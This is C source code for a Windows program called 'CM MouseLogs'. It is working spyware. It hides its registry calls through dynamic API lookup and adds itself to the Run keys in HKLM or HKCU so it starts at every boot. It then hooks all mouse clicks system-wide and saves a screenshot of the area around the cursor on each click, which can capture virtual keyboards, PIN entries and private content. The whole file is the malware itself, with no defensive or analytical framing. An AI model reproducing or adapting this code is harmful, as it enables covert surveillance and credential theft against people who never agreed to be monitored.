#include <windows.h>
#include <stdio.h>
#define SIZE 100


/*
  ###### ##     ##          ##          ###    ########   ######  
##    ## ###   ###          ##         ## ##   ##     ## ##    ## 
##       #### ####          ##        ##   ##  ##     ## ##       
##       ## ### ##          ##       ##     ## ########   ######  
##       ##     ##          ##       ######### ##     ##       ## 
##    ## ##     ##          ##       ##     ## ##     ## ##    ## 
 ######  ##     ##          ######## ##     ## ########   ######  
  

Name:       CM MouseLogs
Verion:     0.1
Team:       CM LABS
Close:      Ctrl+F6
*/

char *Path;

typedef DWORD WINAPI (CALLBACK *GetMODULE)(HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
GetMODULE GetMF;

typedef LONG WINAPI (CALLBACK *OpenKEY)(HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
OpenKEY OpenK;

typedef LONG WINAPI (CALLBACK *SetVALUE)(HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData,DWORD cbData);
SetVALUE SetV;

typedef LONG WINAPI (CALLBACK *CloseKEY)(HKEY hKey);
CloseKEY CloseK;

typedef LONG WINAPI (CALLBACK *QueryVALUE)(HKEY hKey, LPCTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
QueryVALUE QueryV;



LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);



void CheckInstall()
{
    
    HKEY hKey;
    char ValueName[100]={0};
    char Path[MAX_PATH]={0};
    int Return;
    DWORD Buff =100;
    GetMF(NULL,Path,MAX_PATH);
    OpenK(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey); 
    SetV(hKey,"CM MouseLogs",0,REG_SZ,(BYTE *)Path,strlen(Path));
    if( !(Return=QueryV(hKey,"CM MouseLogs",NULL,NULL,(LPBYTE)ValueName,&Buff) == ERROR_SUCCESS))
    {
        CloseK(hKey);
        OpenK(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey);
        SetV(hKey,"CM MouseLogs",0,REG_SZ,(BYTE *)Path,strlen(Path));
    }
    CloseK(hKey);
}





int SaveImage(int x,int y,char *FileName)
{
    BITMAPINFO bmi;
	BITMAPFILEHEADER bfh;
	
	HWND hWnd;
    HDC hdc ;
    HDC memDC;
    HBITMAP hbm ;
    HBITMAP hbmOld;
    BYTE *pbBits;
    
    HANDLE hfile;
    DWORD dwWritten;
    
    hWnd = GetDesktopWindow();
    hdc = GetDC(hWnd);
    memDC = CreateCompatibleDC(hdc);
    hbm = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    hbmOld = (HBITMAP)SelectObject(memDC, hbm);
    
    BitBlt(memDC, 0, 0, SIZE, SIZE, hdc, x-(SIZE/2),y-(SIZE/2), SRCCOPY);
    
    
    ZeroMemory(&bmi, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = SIZE;
    bmi.bmiHeader.biHeight = SIZE;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biCompression = BI_RGB;
    bmi.bmiHeader.biSizeImage =32*SIZE*SIZE/8;
    
    pbBits = (BYTE*)malloc(bmi.bmiHeader.biSizeImage*sizeof(bmi.bmiHeader.biSizeImage));
    GetDIBits(memDC,hbm,0,bmi.bmiHeader.biHeight,pbBits,&bmi,DIB_RGB_COLORS );

    bfh.bfType = ('M' << 8) + 'B';
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + bmi.bmiHeader.biSizeImage + sizeof(BITMAPINFOHEADER);
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    
    hfile = CreateFile(FileName,GENERIC_WRITE,0,0,OPEN_ALWAYS,0,0);
    WriteFile(hfile,&bfh, sizeof(bfh), &dwWritten, NULL);
    WriteFile(hfile,&bmi.bmiHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hfile,pbBits, bmi.bmiHeader.biSizeImage, &dwWritten, NULL);
    CloseHandle(hfile);
    SelectObject(memDC, hbmOld);
    DeleteDC(memDC);
    ReleaseDC(hWnd,hdc);
    DeleteObject(hbm);
    free(pbBits);
}

void GetPath(char *File)
{
    int c=0,p;
    Path=(char*)malloc(300);
    memset(Path,0,300);
    
    //Saca la posicion del ultimo directorio
	while(File[c]!='\0')
    {
        if(File[c]=='\\'){p=c;}
        c++;
    }
    
    c=0;
    while(c<=p)
    {
        Path[c]=File[c];
        c++;
    }
    
}


LRESULT CALLBACK MouseKeyLog(int nCode, WPARAM wParam, LPARAM lParam) 
{   
    if(wParam==WM_LBUTTONDOWN || wParam==WM_RBUTTONDOWN || wParam==WM_MBUTTONDOWN)
    {
		char *FullPath=(char*)malloc(300);
		memset(FullPath,0,300);
        SYSTEMTIME lt;
        POINT Mouse;
        char *Name=(char*)malloc(MAX_PATH);
        memset(Name,0,MAX_PATH);
        GetLocalTime(&lt);
        GetCursorPos(&Mouse);
        sprintf(Name,"\\%d-%d-%d %d.%d.%d.bmp",lt.wYear,lt.wMonth,lt.wDay,lt.wHour,lt.wMinute,lt.wSecond);
        strcat(FullPath,Path);
        strcat(FullPath,"\\Logs");
        CreateDirectory(FullPath,NULL);
        strcat(FullPath,Name);
        SaveImage(Mouse.x,Mouse.y,FullPath);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//int WINAPI WinMain (HINSTANCE hThisInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nFunsterStil)
int main(int argc, char **args)
{
	HINSTANCE hThisInstance = GetModuleHandle(NULL);
    MSG messages;
    GetPath(args[0]);
    HMODULE hIns=(HMODULE)LoadLibrary("kernel32.dll");
    if(hIns)
    {
        if(!(GetMF=(GetMODULE)GetProcAddress(hIns,"GetModuleFileNameA"))){return 1;} 
    }
    else{return 1;}
    
    hIns=(HMODULE)LoadLibrary("Advapi32.dll");
    if(hIns)
    {
        if(!(OpenK=(OpenKEY)GetProcAddress(hIns,"RegOpenKeyExA"))){return 1;} 
        if(!(SetV=(SetVALUE)GetProcAddress(hIns,"RegSetValueExA"))){return 1;} 
        if(!(CloseK=(CloseKEY)GetProcAddress(hIns,"RegCloseKey"))){return 1;} 
        if(!(QueryV=(QueryVALUE)GetProcAddress(hIns,"RegQueryValueExA"))){return 1;} 
    }
    else{return 1;}
    
    
         
  CheckInstall();
  
  //Inicia el Hook
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL,MouseKeyLog,hThisInstance,0);
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    return messages.wParam;
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                 
    {
        default:                      
            return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return 0;
}

